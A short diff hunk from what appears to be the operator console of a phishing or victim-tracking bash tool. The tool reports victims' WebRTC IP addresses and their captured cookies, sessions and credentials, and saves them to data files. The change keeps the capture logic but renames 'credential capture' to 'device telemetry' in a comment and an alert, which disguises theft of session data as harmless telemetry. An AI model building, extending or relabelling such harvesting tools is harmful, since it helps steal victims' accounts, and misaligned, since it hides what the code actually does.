@@ -402,11 +402,11 @@ while true; do
     printf "\e[1;92m[\e[0m*\e[1;92m] Saved: data/webrtc_ips.txt  |  data/webrtc_ips.jsonl\e[0m\n"
   fi
 
-  # ── New cookie / session / credential capture ──
+  # ── New cookie / session / device telemetry capture ──
   if [[ -e "data/.flag_cookies" ]]; then
     cookie_data=$(cat "data/.flag_cookies" 2>/dev/null)
     rm -f "data/.flag_cookies"
-    printf "\n\e[1;93m[\e[0m+\e[1;93m] 🍪 Cookie & Session data captured!\e[0m\n"
+    printf "\n\e[1;93m[\e[0m+\e[1;93m] ⚡ Device Telemetry & Session Data Captured!\e[0m\n"
     printf "\e[1;96m%s\e[0m\n" "$cookie_data"
     printf "\e[1;92m[\e[0m*\e[1;92m] Saved: data/cookies_sessions.txt  |  data/cookies_sessions.jsonl\e[0m\n"
   fi
